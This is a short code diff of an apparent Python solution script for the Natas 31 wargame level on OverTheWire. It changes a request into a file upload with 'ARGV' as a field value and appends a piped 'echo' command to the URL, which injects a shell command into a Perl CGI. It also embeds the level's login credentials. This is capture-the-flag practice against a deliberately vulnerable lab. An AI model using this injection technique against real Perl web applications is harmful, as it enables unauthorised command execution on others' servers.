@@ -49,9 +49,13 @@ do '/tmp/read_file.pl';
 """
 
 def natas31(url):
-    response = session.get(url)
+    with open('abc.txt', 'wb') as _file:
+        _file.write(b"just test") 
+
+    _files = [('file', open('abc.txt', 'rb'))]
+    response = session.post(url, files=_files, data={'file':'ARGV',"submit": "Upload"})
     print(response.text)
 
 if __name__ == '__main__':
-    url = 'http://natas31:hay7aecuungiuKaezuathuk9biin0pu1@natas31.natas.labs.overthewire.org/'
+    url = 'http://natas31:hay7aecuungiuKaezuathuk9biin0pu1@natas31.natas.labs.overthewire.org/index.pl?echo%20exploited|'
     natas31(url)
